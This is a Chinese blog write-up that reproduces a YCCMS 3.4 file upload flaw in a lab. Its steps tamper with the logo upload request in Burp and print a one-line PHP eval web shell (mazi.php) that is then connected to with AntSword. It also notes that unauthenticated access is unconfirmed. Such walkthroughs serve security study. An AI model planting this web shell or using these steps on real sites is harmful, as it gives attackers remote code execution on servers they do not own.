ailx10说：这篇是我2024年9月写的。YCCMS 这篇，我先在后台上传 LOGO 时抓到请求，再改文件声明和内容，重放后找到落地的 logo.php，继续验证执行与连接。和前面的普通上传练习相比，这次入口更藏在日常界面里，不点一次很难知道后面实际发了什么。笔记留着从正常操作到改包的过程，不过最初是在登录状态抓的，是否无认证也能重放还需要另作对照。先把一次真实操作看完整，再问服务端到底信了哪个值，是这次留下的思路。

---

今天复现一下YCCMS 3.4 文件上传漏洞，这个本来是一个后台漏洞，但是由于上传logo是一个未授权访问，所以造成前台文件上传漏洞，正好上传一个昨天告警分析发现的有趣的代码执行（[ailx10：又抓到一个有意思的代码执行](/posts/a0769/)），举一反三，灵活应用，通过burp修改Content-Type 和php文件头，成功上传php文件，也成功蚁剑连接了。

（1）先登录后台并观察 LOGO 上传接口。原记录从已登录会话开始，未展示无 Cookie 重放，因此未授权访问尚待验证。

```
http://192.168.220.175/admin/?a=call&m=upfile&type=content
```

![](/notes-assets/904170a0213cf91e9322.webp)

（2）选择文件，确认上传，在burp中进行重放，修改 Content-Type 和 php 文件内容如下所示，得到200 OK的响应，找到上传成功的路径

```
http://192.168.220.175/view/index/images/logo.php
```

![](/notes-assets/98f09e9892f726942a24.webp)

（3）访问上传成功的路径，确认php文件上传并执行成功

![](/notes-assets/2b2d8abee783b7bb0ba0.webp)

（4）基于这个上传的php，再上传一个一句话木马

```
<?php @eval($_POST['x']); ?>
```

得到`mazi.php`的路径

```
http://192.168.220.175/view/index/images/mazi.php
```

![](/notes-assets/55d42601a0fc274a7882.webp)

（5）蚁剑连接，成功

![](/notes-assets/abc55f5a1fc6a0663b2a.webp)

![](/notes-assets/b93db08a24667c04f489.webp)

抓包时是否登录，是这份记录还要回头核对的条件。一个200响应只是对请求的回答，文件在哪里、内容是什么、访问时怎样处理，都应跟着保留下来。
